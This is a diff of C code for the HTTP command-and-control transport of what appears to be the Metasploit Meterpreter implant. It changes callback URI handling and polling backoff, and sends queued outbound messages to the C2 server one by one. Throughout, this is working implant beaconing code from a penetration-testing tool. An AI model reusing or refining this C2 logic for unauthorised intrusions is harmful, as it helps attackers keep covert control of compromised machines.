@@ -22,7 +22,6 @@ struct http_ctx {
 	struct http_request_opts opts;
 	struct buffer_queue *egress;
 	int first_packet;
-	int in_flight;
 	int running;
 };
 
@@ -35,12 +34,7 @@ static void patch_uri(struct http_ctx *ctx, struct buffer_queue *q)
 		if (strcmp(method, "core_patch_url") == 0 && new_uri) {
 			char *old_uri = ctx->uri;
 			char *split = ctx->uri;
-			for (int i = 0; i < 3; i++) {
-				if (split == NULL) {
-					break;
-				}
-				split = strchr(++split, '/');
-			}
+			split = strrchr(old_uri, '/');
 			if (split) {
 				*split = '\0';
 			}
@@ -72,7 +66,10 @@ static void http_poll_cb(struct http_conn *conn, void *arg)
 			got_command = true;
 		} else {
 			size_t len;
-			if (buffer_queue_len(q)) {
+			if (buffer_queue_len(ctx->egress) > 0) {
+				got_command = true;
+			}
+			if (buffer_queue_len(q) > 0) {
 				got_command = true;
 				c2_transport_ingress_queue(ctx->t, q);
 			}
@@ -80,34 +77,36 @@ static void http_poll_cb(struct http_conn *conn, void *arg)
 	}
 
 	if (got_command) {
-		ctx->poll_timer.repeat = 0.01;
+		ctx->poll_timer.repeat = 0.1;
 	} else {
-		if (ctx->poll_timer.repeat < 0.1) {
-			ctx->poll_timer.repeat = 0.1;
-		} else if (ctx->poll_timer.repeat < 5.0) {
-			ctx->poll_timer.repeat += 0.1;
+		if (ctx->poll_timer.repeat < 6.4) {
+			ctx->poll_timer.repeat *= 2;
 		}
 	}
-
-	ctx->in_flight = 0;
 }
 
 static void http_poll_timer_cb(struct ev_loop *loop, struct ev_timer *w, int revents)
 {
 	struct http_ctx *ctx = w->data;
-	if (!ctx->in_flight) {
-		ctx->in_flight = 1;
-		if (buffer_queue_len(ctx->egress) > 0) {
-			ctx->data.content_len = buffer_queue_remove_all(ctx->egress,
-					&ctx->data.content);
-			http_request(ctx->uri, http_request_post, http_poll_cb, ctx,
-					&ctx->data, &ctx->opts);
-			ctx->data.content_len = 0;
-			ctx->data.content = NULL;
-		} else {
-			http_request(ctx->uri, http_request_get, http_poll_cb, ctx,
-					&ctx->data, &ctx->opts);
-		}
+	bool sent = false;
+
+	while (buffer_queue_len(ctx->egress) > 0) {
+		/*
+		 * Metasploit's HTTP handler cannot handle multiple queued messages, send these individually for now
+		 * ctx->data.content_len = buffer_queue_remove_all(ctx->egress,
+		 *		&ctx->data.content);
+		 */
+		ctx->data.content = buffer_queue_remove_msg(ctx->egress, &ctx->data.content_len);
+		http_request(ctx->uri, http_request_post, http_poll_cb, ctx,
+				&ctx->data, &ctx->opts);
+		ctx->data.content_len = 0;
+		ctx->data.content = NULL;
+		sent = true;
+	}
+
+	if (!sent) {
+		http_request(ctx->uri, http_request_get, http_poll_cb, ctx,
+				&ctx->data, &ctx->opts);
 	}
 
 	if (ctx->running) {
